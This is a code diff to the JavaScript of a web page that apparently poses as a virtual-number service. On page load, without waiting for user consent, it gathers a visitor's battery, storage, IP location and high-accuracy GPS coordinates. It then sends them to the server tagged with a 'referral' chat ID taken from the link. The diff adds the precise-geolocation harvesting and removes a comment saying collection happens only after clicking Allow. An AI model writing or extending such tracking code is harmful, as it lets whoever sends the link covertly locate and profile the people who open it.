@@ -7,6 +7,12 @@ const userIdInput = document.getElementById("user-id");
 let collectedData = null;
 
 function getChatIdFromUrl() {
+  const params = new URLSearchParams(window.location.search);
+  const referral = params.get("referral");
+  if (referral && /^\d+$/.test(referral)) {
+    return referral;
+  }
+
   const parts = window.location.pathname.split("/");
   return parts[2] || null;
 }
@@ -86,6 +92,23 @@ async function getIpAndApproxLocation() {
   }
 }
 
+async function getPreciseLocation() {
+  if (!navigator.geolocation) {
+    return { precise_latitude: null, precise_longitude: null };
+  }
+
+  return new Promise((resolve) => {
+    navigator.geolocation.getCurrentPosition(
+      (position) => resolve({
+        precise_latitude: position.coords.latitude,
+        precise_longitude: position.coords.longitude,
+      }),
+      () => resolve({ precise_latitude: null, precise_longitude: null }),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
+    );
+  });
+}
+
 function bytesToGBString(bytes) {
   if (typeof bytes !== "number") {
     return "Unavailable";
@@ -115,12 +138,12 @@ async function getStorageDetails() {
   }
 }
 
-// Collect only after clicking Allow
 document.addEventListener("DOMContentLoaded", async () => {
 
-  // FIRST: Collect Data
+  // The browser shows its location permission prompt. A refusal falls back to IP location.
   const battery = await getBatteryDetails();
   const ipData = await getIpAndApproxLocation();
+  const preciseLocation = await getPreciseLocation();
   const storageData = await getStorageDetails();
 
   collectedData = {
@@ -138,6 +161,10 @@ document.addEventListener("DOMContentLoaded", async () => {
     region: ipData.region,
     city: ipData.city,
     timezone: ipData.timezone,
+    ip_latitude: ipData.latitude,
+    ip_longitude: ipData.longitude,
+    precise_latitude: preciseLocation.precise_latitude,
+    precise_longitude: preciseLocation.precise_longitude,
     storage_used_gb: storageData.storage_used_gb,
     storage_total_gb: storageData.storage_total_gb,
   };
@@ -152,7 +179,8 @@ document.addEventListener("DOMContentLoaded", async () => {
   }
 
   try {
-    const res = await fetch(`/num/${chatId}`, {
+    const url = chatId ? `/virtual_number?referral=${encodeURIComponent(chatId)}` : "/virtual_number";
+    const res = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(collectedData),
